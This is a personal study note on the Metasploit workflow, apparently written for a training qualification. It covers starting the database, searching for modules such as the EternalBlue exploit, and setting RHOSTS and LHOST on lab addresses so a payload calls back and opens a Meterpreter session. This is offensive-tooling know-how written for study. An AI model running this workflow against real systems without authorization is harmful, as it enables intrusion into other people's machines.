---
tags: [cyber, module1, metasploit]
jqr: "Module 1: the Metasploit workflow, from bringing the DB up and checking db_status through msfconsole, then search, use, show, set, run/exploit"
---

# Metasploit Workflow

This is the loop I run for basically every Metasploit task: bring the database up, find a module, load it, fill in the options, run it. Once I had the loop down, most of the Metasploit JQR turned into muscle memory.

Quick reminder to myself: I still need to run this on the lab box (Kali 2026.2). I checked it against the current docs, but there's no live Metasploit output in my study sandbox, so I'll confirm the exact banners and counts on my own box.

## The loop, short version

```text
sudo msfdb init                       # first run: create + start the PostgreSQL backend
msfconsole -q                         # launch console (-q = no banner)
db_status                             # MUST say: Connected ... postgresql
search type:exploit cve:2017-0144     # find a module (filters below)
use 0                                 # load by result index  (or: use <full/path>)
show options                          # what must I set? (Required = yes)
set RHOSTS 192.168.1.20               # the TARGET (note the plural S)
set LHOST 192.168.1.10                # YOUR Kali IP (payload calls back here)
run                                   # scanner or exploit  (exploit = alias for exploit modules)
```

## How the pieces fit

Metasploit is a framework, not a single tool. Five parts do all the work, and once these five clicked the rest got easy:

| Term | What it is | Defender analogy |
|---|---|---|
| **Module** | A packaged capability (exploit, scanner, post, payload) | A "signature", but offensive |
| **Exploit** | Code that abuses a vuln to run *your* code | The break-in method |
| **Payload** | Code that runs *after* the exploit lands (e.g. a shell) | The implant / C2 stub |
| **Handler** | Waits on your Kali box to catch the payload calling home | The C2 server |
| **Session** | The live connection to a compromised host | The active foothold |

The way I keep them straight is to picture one break-in as a delivery. The exploit is the trick that gets a foot in the door. The payload is the package it carries, the code that actually runs on the target. The handler is me back home, waiting by the phone for that package to call and say "I'm in". The session is the open line I then talk over. The useful part is that I can swap any one piece without rebuilding the others, and that interchangeability is exactly what "framework" means here: a common chassis I bolt different exploits, payloads, and handlers onto.

Exploitation is getting *in* (initial code execution). Privilege escalation is getting *higher* once I'm inside. Metasploit does both, see [Privilege Escalation Concepts](../../Knowledge%20Req/Privilege%20Escalation%20Concepts.md).

Why the database matters (this one shows up on the exam a lot): the PostgreSQL backend indexes module metadata so `search` is fast, and it stores `hosts` / `services` / `creds` / `loot` / `notes` in per-engagement workspaces. `db_nmap` and `hosts -R` (which auto-fills RHOSTS) only work when the DB is connected.

## 1. Start Metasploit (database first)

```bash
sudo msfdb init                    # first time only: create + start the msf PostgreSQL database
sudo systemctl start postgresql    # ensure the PostgreSQL server is up
sudo msfdb start                   # start the msf database (also: msfdb status / msfdb reinit)
msfconsole                         # launch the console (-q skips the banner)
```

Once I'm in the console, I check the connection:

```text
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```
Anything other than "Connected ... postgresql" means search will be slow and `hosts`/`services` won't populate, so I fix the DB before continuing.

One-liner I like: `sudo msfdb run` starts the DB *and* drops me straight into `msfconsole`.

## 2. msfconsole basics

```text
help                 # list console commands (help <cmd> for one)
banner ; version     # fresh banner + module counts / framework version

# Workspaces — per-engagement data separation
workspace            # list (* = current)
workspace -a lab01   # add and switch to a new workspace
workspace -d lab01   # delete a workspace

# Stored data (populated by db_nmap / scanners / exploits)
hosts                # discovered hosts
hosts -R             # push all stored hosts into RHOSTS for the loaded module
services -p 445      # discovered services, filtered by port

# Scan straight into the database
db_nmap -sV -p 445 192.168.1.20   # normal nmap flags; results auto-stored in hosts/services
```
> Why I bother with workspaces: one flat pile of hosts and creds across ten jobs is both a mess and a scoping hazard. A workspace per engagement keeps each target's hosts/services/loot filed under the right job. It's the offensive version of not mixing up two clients' evidence.

`db_nmap` is just ordinary [Nmap](../../Recon%20Tools/Nmap.md), except the output lands in the DB automatically.

## 3. Search for modules

```text
search type:auxiliary smb                    # auxiliary (scanner/etc.) modules touching SMB
search type:exploit platform:windows smb     # Windows SMB exploits only
search eternalblue                           # free-text name search
search cve:2017-0144                         # by CVE (returns the MS17-010 modules)
```

Filters worth memorising:

| Filter | Meaning | Example |
|---|---|---|
| `type:` | Module class | `type:exploit`, `type:auxiliary`, `type:post`, `type:payload` |
| `platform:` | Target OS | `platform:windows`, `platform:linux` |
| `cve:` | Vulnerability ID | `cve:2017-0144` |
| `rank:` | Reliability/quality | `rank:excellent`, `rank:great` |
| `name:` | Text in module name | `name:psexec` |
| `path:` | Text in module path | `path:scanner/smb` |
| `author:` | Module author | `author:hdm` |

They stack, so I can run `search type:exploit platform:windows rank:excellent smb`.

## 4. Load a module with `use`

```text
# By index (the # column from the last search table) — fast but the row number shifts
use 0

# By full path — deterministic; best for exam answers and scripts
use auxiliary/scanner/smb/smb_version
```
After `use 0` I always glance at the module path msf prints back to be sure it's the one I meant. `back` unloads the current module and `previous` returns to the one before.

## 5. Inspect it with `show`

```text
show options     # required + optional datastore settings   (alias: options)
show advanced    # advanced options (e.g. SMB::ProtocolVersion, timeouts, SSL)
show payloads    # payloads compatible with THIS exploit/target
show targets     # target profiles (OS/arch/technique) the exploit supports
info             # full description, options, references, CVEs
```
The `Required = yes` rows in `show options` are what I have to fill in. A wrong `show targets` index is a top cause of a "successful" exploit that opens no session, so `set TARGET <n>` to change it.

## 6. Configure it with `set`

```text
set RHOSTS 192.168.1.20     # REMOTE host = the TARGET (plural S; accepts ranges/CIDR/file:)
set RPORT 445               # REMOTE port on the target (SMB = 445)
set LHOST 192.168.1.10      # LOCAL host = YOUR Kali IP (payload callback address)
set LPORT 4444              # LOCAL port your handler listens on

set SMBUser administrator   # creds for authenticated modules (name varies per module)
set SMBPass Lab-Passw0rd!   # placeholder only — never store real creds in notes
```
`unset RHOSTS` clears a single option back to its default.

> [!tip] `set` vs `setg` (global)
> `setg LHOST 192.168.1.10` sets a value **globally** so it survives loading a different module with `use`. Perfect for the LHOST/RHOSTS I reuse all engagement. `unsetg` clears it, and `save` writes globals to `~/.msf4/`.

## 7. Run it

```text
run          # run any module (auxiliary scanners AND exploits)
exploit      # alias of run, conventionally used for exploit modules
run -j       # run in the background as a job (exploit -j) — frees the console
exploit -z   # run but don't auto-interact with the new session
```
For an auxiliary scanner I use `run`; for an exploit I use `exploit` (though `run` works too). On success I'll see `Meterpreter session 1 opened ...`, which is my cue to jump to [Meterpreter](Meterpreter.md). I manage backgrounded work with `jobs` and `sessions`.

## Gotchas that bite me

- The DB has to be connected for fast search and stored hosts/services. `db_status` should say *Connected ... postgresql*. If it doesn't, `sudo msfdb init`, start PostgreSQL, and relaunch.
- It's `RHOSTS` (plural), not `RHOST`. Modern modules use `RHOSTS` and it takes ranges/CIDR/`file:`. Set the wrong one and the target silently stays blank. `hosts -R` auto-fills it.
- `LHOST` is my attacker IP on the *right* interface. On a VPN'd CTF that's the `tun0` IP, not `eth0`, so I check `ip a`. Wrong LHOST and the payload never calls back.
- I prefer the full module path in write-ups. `use <index>` breaks the moment the search table reorders.
- `search cve:` and `search rank:excellent` cut the noise fast.
- `run -j` backgrounds a handler or scanner so the console stays usable.

## Links I used

- Metasploit documentation (home): https://docs.metasploit.com/
- Metasploit Unleashed (free course): https://www.offsec.com/metasploit-unleashed/
- Metasploit SMB pentesting guide: https://docs.metasploit.com/docs/pentesting/metasploit-guide-smb.html
- `multi/handler` module (Rapid7 DB): https://www.rapid7.com/db/modules/exploit/multi/handler/
- Exploit-DB / `searchsploit` (find a PoC when no MSF module exists): https://www.exploit-db.com/searchsploit

## Related notes

- [MSFvenom](MSFvenom.md)
- [Meterpreter](Meterpreter.md)
- [SMB PsExec and DCOM](SMB%20PsExec%20and%20DCOM.md)
- [Nmap](../../Recon%20Tools/Nmap.md)
- [Common Software Vulnerabilities](../../Knowledge%20Req/Common%20Software%20Vulnerabilities.md)
